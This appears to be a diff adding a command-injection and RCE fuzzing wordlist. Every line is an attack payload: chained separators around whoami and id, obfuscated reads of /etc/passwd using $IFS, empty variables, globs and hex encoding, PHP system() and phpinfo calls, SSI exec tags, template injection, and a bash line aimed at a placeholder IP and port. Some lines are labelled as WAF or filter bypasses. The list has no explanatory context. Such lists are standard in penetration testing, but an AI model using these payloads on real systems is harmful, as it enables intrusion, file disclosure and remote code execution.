@@ -1,0 +1,174 @@
+'
+whoami
+'
+"
+whoami
+"
+`
+whoami
+`
+;
+whoami
+;
+,
+whoami
+,
+|
+whoami
+|
+whoami
+|
+\
+whoami
+''
+whoami
+''
+*
+whoami
+*
+whoami
+*
+(
+whoami
+)
+\
+whoami
+\
+&
+whoami
+&
+",
+system('ls')
+;"
+|uname -a+||a+#'+|ls+-la|a+#|"+|ls+-la||a+#  Rce waf bypass
+",system('ls');" double quote Rce filter bypass
+${@system("id")} eval code bypass
+${@phpinfo()}
+;phpinfo();
+;phpinfo
+;system('cat%20/etc/passwd')
+;system('id')
+$(id)
+;${@print(md5(whoami))}
+;${@print(md5("whoami"))}
+$;id
+$(`cat /etc/passwd`)
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="id;-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+php -r 'var_dump(exec("id"));'
+&lt;!--#exec%20cmd=&quot;id;--&gt;
+/bin$u/bash$u <ip> <port>
+cat$u+/etc$u/passwd$u
+";cat+/etc/passwd+#
+;+$u+cat+/etc$u/passwd$u
+;+$u+cat+/etc$u/passwd+\#
+/???/??t+/???/??ss??
+/?in/cat+/et?/passw?
+;+cat+/e'tc/pass'wd
+c\\a\\t+/et\\c/pas\\swd
+cat /etc$u/passwd
+(sy.(st).em)(whoami);
+;cat+/etc/passwd
+;cat+/etc/passwd+#
+;cat$u+/etc$u/passwd$u
+;cat%20/etc/passwd
+;cat /e${hahaha}tc/${heywaf}pas${catchthis}swd
+;cat$u /etc$u/passwd$u
+;{cat,/etc/passwd}
+;cat</etc/passwd
+;cat$IFS/etc/passwd
+;echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
+;/usr/bin/id;
+|cat%20/etc/passwd
+|cat /e${hahaha}tc/${heywaf}pas${catchthis}swd
+|cat$u /etc$u/passwd$u
+|{cat,/etc/passwd}
+|cat</etc/passwd
+|cat$IFS/etc/passwd
+|echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
+|/usr/bin/id|
+||cat%20/etc/passwd
+||cat /e${hahaha}tc/${heywaf}pas${catchthis}swd
+||cat$u /etc$u/passwd$u
+||{cat,/etc/passwd}
+||cat</etc/passwd
+||cat$IFS/etc/passwd
+||echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
+||/usr/bin/id||
+&&cat%20/etc/passwd
+&&cat /e${hahaha}tc/${heywaf}pas${catchthis}swd
+&&cat$u /etc$u/passwd$u
+&&{cat,/etc/passwd}
+&&cat</etc/passwd
+&&cat$IFS/etc/passwd
+&&echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
+&&/usr/bin/id&&
+&cat%20/etc/passwd
+&cat /e${hahaha}tc/${heywaf}pas${catchthis}swd
+&cat$u /etc$u/passwd$u
+&{cat,/etc/passwd}
+&cat</etc/passwd
+&cat$IFS/etc/passwd
+&echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd
+&/usr/bin/id&
+`cat%20/etc/passwd`
+`cat /e${hahaha}tc/${heywaf}pas${catchthis}swd`
+`cat$u /etc$u/passwd$u`
+`{cat,/etc/passwd}`
+`cat</etc/passwd`
+`cat$IFS/etc/passwd`
+`echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd`
+`/usr/bin/id`
+$(cat%20/etc/passwd)
+$(cat /e${hahaha}tc/${heywaf}pas${catchthis}swd)
+$(cat$u /etc$u/passwd$u)
+$({cat,/etc/passwd})
+$(cat</etc/passwd)
+$(cat$IFS/etc/passwd)
+$(echo${IFS}"RCE"${IFS}&&cat${IFS}/etc/passwd)
+$(/usr/bin/id)
+id||whoami;
+id|whoami;
+id&&whoami;
+id&whoami;
+127.0.0.1;ls
+127.0.0.1;i"d
+;unam"e${IFS}-a
+;l"s${IFS}-la
+'i'd
+"i"d
+\u\n\a\m\e \-\a
+cat$u /etc$u/passwd$u
+w${u}h${u}o${u}a${u}m${u}i
+i$(u)d
+i`u`d
+{uname,-a}
+cat${IFS}/etc/passwd
+cat$IFS/etc/passwd
+IFS=];b=cat]/etc/passwd;$b
+IFS=,;`cat<<<cat,/etc/passwd`
+uname${IFS}-a
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
+cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??
+cat${IFS}${PATH%%u*}etc${PATH%%u*}passwd
+${PATH##*s????}${PATH%%u*}c??${IFS}${PATH%%u*}e??${PATH%%u*}??ss??
+${PATH##*s????}${PATH%%u*}ca${u}t${IFS}${PATH%%u*}et${u}c${PATH%%u*}pas${u}swd
+${PATH##*s????}${PATH%%u*}bas${u}h${IFS}${PHP_CFLAGS%%f*}c${IFS}l${u}s
+${PATH:0:1}bi?${PATH:0:1}ca?${IFS}${PATH:0:1}et?${PATH:0:1}??sswd
+tail${IFS}${APACHE_CONFDIR%${APACHE_CONFDIR#?}}et?${APACHE_CONFDIR%${APACHE_CONFDIR#?}}pas?wd
+c${a}at${IFS}${APACHE_CONFDIR%apache2}pas${s}swd
+ca${jjj}t${IFS}${APACHE_RUN_DIR%???????????????}et${jjj}c${APACHE_RUN_DIR%???????????????}pas${jjj}swd
+c${u}at${IFS}${PHP_INI_DIR%%u*p}e${u}tc${PHP_INI_DIR%%u*p}p${u}asswd
+cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
+cat `xxd -r -p <<< 2f6574632f706173737764`
+cat `xxd -r -ps <(echo 2f6574632f706173737764)`
+1;uname${IFS}-a
+1;uname${IFS}-a;#
+1;uname${IFS}-a;#${IFS}'
+1;uname${IFS}-a;#${IFS}';
+/*$(id)`id`
+/*$(id)`id``*/-id-'/*$(id)`id` #*/-id||'"||id||"/*`*/
+/*$(id)`id``*/id'/*$(id)`id` #*/id||'"||id||"/*`*/
